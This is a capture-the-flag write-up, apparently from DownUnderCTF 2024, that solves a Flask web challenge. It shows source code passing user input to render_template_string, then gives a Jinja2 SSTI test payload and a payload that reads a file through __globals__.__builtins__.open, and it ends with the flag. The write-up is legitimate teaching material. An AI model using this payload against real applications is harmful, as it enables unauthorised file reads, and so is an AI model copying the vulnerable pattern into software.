---
title: "parrot the emu"
description: "It is so nice to hear Parrot the Emu talk back"
pubDate: 2024-07-10
ctf: "DownUnderCTF 2024"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/24-downunder/icon.png"
---



We are given web source and an instance. The website reflects what you type:

![parrottheemu](images/24-downunder/parrottheemu.png)

Looking in the source code is something of interest:
```python
...
    if request.method == 'POST':
        user_input = request.form.get('user_input')
        try:
            result = render_template_string(user_input)
        except Exception as e:
            result = str(e)
...
```

`render_template_string` is generally dangerous with unvalidated user input as it's vulnerable to SSTI, as this is Python, Jinja2 SSTI is quite a good start.

I first tried the payload `{%raw%}{{7*7}}{%endraw%}` and the parrot responds with `49`, perfect!

Now we need to try to read the `flag` file, I try various payloads but find this one works: `{%raw%}{{ get_flashed_messages.__globals__.__builtins__.open("./flag").read() }}{%endraw%}`.

![parrottheemusolve](images/24-downunder/parrottheemu-solve.png)

Flag: `DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}`